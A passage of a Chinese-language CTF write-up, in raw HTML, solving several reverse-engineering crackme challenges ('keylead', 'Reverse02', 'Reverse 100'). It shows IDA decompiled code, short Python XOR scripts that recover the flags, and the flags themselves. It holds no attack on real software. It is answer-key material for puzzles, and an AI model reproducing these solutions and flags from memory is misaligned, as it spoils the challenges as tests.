class="line">              v56 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*] Nice job, here is the flag: "</span>);</span><br><span class="line">              v57 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v56, &amp;v84);</span><br><span class="line">              v58 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v57, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v58, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              fctx.call_site = <span class="number">3</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v72);</span><br><span class="line">              fctx.call_site = <span class="number">5</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v73);</span><br><span class="line">              fctx.call_site = <span class="number">7</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v74);</span><br><span class="line">              fctx.call_site = <span class="number">9</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v75);</span><br><span class="line">              fctx.call_site = <span class="number">11</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v76);</span><br><span class="line">              fctx.call_site = <span class="number">13</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v77);</span><br><span class="line">              fctx.call_site = <span class="number">15</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v78);</span><br><span class="line">              fctx.call_site = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v83);</span><br><span class="line">              fctx.call_site = <span class="number">17</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              fctx.call_site = <span class="number">-1</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">key = [<span class="number">0x02</span>, <span class="number">0x37</span>, <span class="number">0x0F</span>, <span class="number">0x35</span>, <span class="number">0x0F</span>, <span class="number">0x3C</span>, <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0x3C</span>, <span class="number">0x30</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x12</span>, <span class="number">0x37</span>, <span class="number">0x15</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x51</span>]</span><br><span class="line">enc = [<span class="number">0x13</span>, <span class="number">0x21</span>, <span class="number">0x38</span>, <span class="number">0x15</span>, <span class="number">0x3D</span>, <span class="number">0x33</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x44</span>, <span class="number">0x05</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x17</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x77</span>, <span class="number">0x1A</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0x7D</span>, <span class="number">0x05</span>, <span class="number">0x4A</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0x70</span>, <span class="number">0x42</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0x08</span>]</span><br><span class="line">k = <span class="number">116</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">lenEnc = len(enc)</span><br><span class="line">lenKey = len(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenKey):</span><br><span class="line">key[i] = key[i] ^ k</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenEnc):</span><br><span class="line">flag += chr(enc[i] ^ key[i % lenKey])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="keylead"><a href="#keylead" class="headerlink" title="keylead"></a>keylead</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file keylead</span><br><span class="line">keylead: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1d5a4a7ffa57a2335f88093530dc89c1c71ec72, stripped</span><br></pre></td></tr></table></figure><p>发现功能和前一题一模一样，就是变成了 elf，在 IDA 里各种 patch 就能直接出 flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌─[root][bead49282cbc][~/tmp]</span><br><span class="line">└─▪ ./keylead</span><br><span class="line">hi all ----------------------</span><br><span class="line">Welcome to dice game!</span><br><span class="line">You have to roll 5 dices and get 3, 1, 3, 3, 7 in order.</span><br><span class="line">Press enter to roll.</span><br><span class="line"></span><br><span class="line">You rolled 5, 3, 4, 4, 5.</span><br><span class="line">You rolled as I said! I&apos;ll give you the flag.</span><br><span class="line">ASIS&#123;1fc1089e328eaf737c882ca0b10fcfe6&#125;</span><br></pre></td></tr></table></figure><p>输出 flag 的函数也不用逆，直接照着实现就行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  m = <span class="number">0</span>;</span><br><span class="line">  n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( m != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(enc[<span class="number">14</span> * m++]);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( n &lt;= <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">20</span> * m - <span class="number">8</span> * n++]);</span><br><span class="line">      v1 = n + <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="number">3</span> * m;</span><br><span class="line">      <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v2 + <span class="number">11</span> + v1]);</span><br><span class="line">      v2 *= <span class="number">5</span>;</span><br><span class="line">      v8 = v1 - <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v2 + v8]);</span><br><span class="line">      v12 = v2 / <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="keyword">if</span> ( !v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v12]);</span><br><span class="line">            v15 = v12 ^ <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">                <span class="built_in">putchar</span>(enc[<span class="number">10</span> * (i % <span class="number">2</span>) + <span class="number">3</span> + v15]);</span><br><span class="line">              v13 = v15 + <span class="number">1</span>;</span><br><span class="line">LABEL_44:</span><br><span class="line">              <span class="built_in">putchar</span>(enc[v13 / <span class="number">3</span>]);</span><br><span class="line">              <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v13 += <span class="number">2</span> * v13 + <span class="number">13</span>;</span><br><span class="line">                i = <span class="number">19</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( i == <span class="number">2</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                i = v13-- + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i - <span class="number">22</span>) &lt;= <span class="number">0xA</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v14 = v13 - <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span> ( j = i - v14; ; j = <span class="number">8</span> )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_58:</span><br><span class="line">                  <span class="built_in">putchar</span>(enc[v14 + <span class="number">1</span>]);</span><br><span class="line">                  v16 = v14 + <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( j == <span class="number">11</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v13 = (v16 + <span class="number">14</span>) / <span class="number">2</span>;</span><br><span class="line">                    i = <span class="number">11</span> * (v13 / <span class="number">6</span>);</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( j != <span class="number">13</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  v12 = v16 + <span class="number">8</span>;</span><br><span class="line">                  v8 = <span class="number">2</span>;</span><br><span class="line">LABEL_51:</span><br><span class="line">                  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(enc[v12 - <span class="number">10</span>]);</span><br><span class="line">                    <span class="keyword">if</span> ( v8 == v12 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v4 = v8 + <span class="number">2</span>;</span><br><span class="line">                      v5 = v12 + <span class="number">2</span>;</span><br><span class="line">                      <span class="built_in">putchar</span>(enc[v5 / <span class="number">2</span> + v4 / <span class="number">5</span>]);</span><br><span class="line">                      i = v4 / <span class="number">2</span>;</span><br><span class="line">                      <span class="built_in">putchar</span>(enc[i / <span class="number">5</span> + v5]);</span><br><span class="line">                      v13 = v5 + i - <span class="number">1</span> + v5;</span><br><span class="line">                      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">                        <span class="built_in">putchar</span>(enc[v13 - <span class="number">19</span>]);</span><br><span class="line">                        <span class="keyword">if</span> ( i == <span class="number">2</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v3 = v13 + <span class="number">1</span>;</span><br><span class="line">                          <span class="built_in">putchar</span>(enc[v3 / <span class="number">2</span> - <span class="number">3</span>]);</span><br><span class="line">                          v13 = v3 / <span class="number">5</span> + <span class="number">2</span>;</span><br><span class="line">                          i = <span class="number">2</span>;</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          v12 = v13 - <span class="number">31</span>;</span><br><span class="line">                          v8 = <span class="number">9</span>;</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_51;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ( i != <span class="number">19</span> )</span><br><span class="line">                          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                        i = <span class="number">2</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ( i == <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v8 = <span class="number">17</span>;</span><br><span class="line">                        v12 = v13 % <span class="number">5</span> - <span class="number">17</span> + v13;</span><br><span class="line">LABEL_20:</span><br><span class="line">                        <span class="built_in">putchar</span>(enc[v12 - v8 + <span class="number">9</span>]);</span><br><span class="line">                        v12 += ~v8++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( v8 != <span class="number">9</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( v8 != <span class="number">2</span> )</span><br><span class="line">                      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">                    j = <span class="number">2</span>;</span><br><span class="line">                    v16 = v12 - <span class="number">18</span>;</span><br><span class="line">LABEL_64:</span><br><span class="line">                    v6 = <span class="number">9</span> * j;</span><br><span class="line">                    <span class="built_in">putchar</span>(enc[v16 / <span class="number">2</span> + v6 + v6 % <span class="number">10</span>]);</span><br><span class="line">                    m = v16 + <span class="number">1</span>;</span><br><span class="line">                    n = v6 % <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="built_in">putchar</span>(enc[v12 - <span class="number">16</span>]);</span><br><span class="line">                  v14 = v12 / <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( j == <span class="number">8</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v15 = v16 + <span class="number">1</span>;</span><br><span class="line">                  i = <span class="number">7</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_64;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(enc[<span class="number">21</span> - v8]);</span><br><span class="line">            v13 = <span class="number">49</span>;</span><br><span class="line">            i = v8 / <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v8 != <span class="number">3</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">          <span class="built_in">putchar</span>(enc[<span class="number">2</span> * (v12 / <span class="number">3</span>)]);</span><br><span class="line">          v13 = v12 / <span class="number">3</span>;</span><br><span class="line">          i = <span class="number">9</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v13 == <span class="number">10</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(enc[i + <span class="number">8</span>]);</span><br><span class="line">                v14 = <span class="number">9</span>;</span><br><span class="line">                j = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v13 == <span class="number">11</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">putchar</span>(enc[i / <span class="number">7</span>]);</span><br><span class="line">                v13 = i-- - <span class="number">11</span>;</span><br><span class="line">              &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">              <span class="keyword">if</span> ( i != <span class="number">9</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="built_in">putchar</span>(enc[v13 * v13 + <span class="number">7</span>]);</span><br><span class="line">              v13 = v13 * v13 + <span class="number">1</span>;</span><br><span class="line">              i = <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( i != <span class="number">13</span> );</span><br><span class="line">          <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v13 + <span class="number">12</span>]);</span><br><span class="line">          v8 = <span class="number">3</span>;</span><br><span class="line">          v12 = <span class="number">3</span> * v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">3</span> * v12 + <span class="number">1</span>]);</span><br><span class="line">        v0 = v12 * v12;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[v0 - <span class="number">15</span>]);</span><br><span class="line">        m = v0 - <span class="number">15</span>;</span><br><span class="line">        n = <span class="number">4</span>;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">4</span>]);</span><br><span class="line">LABEL_21:</span><br><span class="line">        <span class="keyword">if</span> ( n != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">putchar</span>(enc[m + <span class="number">6</span>]);</span><br><span class="line">        v12 = m - <span class="number">3</span>;</span><br><span class="line">        v8 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n != <span class="number">8</span> );</span><br><span class="line">    <span class="built_in">putchar</span>(enc[<span class="number">2</span> * m + <span class="number">32</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reverse02"><a href="#Reverse02" class="headerlink" title="Reverse02"></a>Reverse02</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Reverse02.exe</span><br><span class="line">Reverse02.exe: PE32 executable (GUI) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>定位到<code>MessageBoxA</code>，把这部分逆一下就完事了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+1h] [ebp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line"></span><br><span class="line">  Dst = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  strncpy_s(&amp;Dst, <span class="number">0x31</span>u, <span class="string">"flag:&#123;NSCTF_md57e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0&#125;"</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="string">'&#125;'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v0 ^= <span class="number">7u</span>;</span><br><span class="line">      ++v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v0 != <span class="string">'&#125;'</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, &amp;Dst, <span class="string">"Flag"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'7e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">flag += chr(ord(enc[i]) ^ <span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="Reverse-100"><a href="#Reverse-100" class="headerlink" title="Reverse 100"></a>Reverse 100</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Reverse\ 100.exe</span><br><span class="line">Reverse 100.exe: PE32 executable (console) Intel 80386, for MS 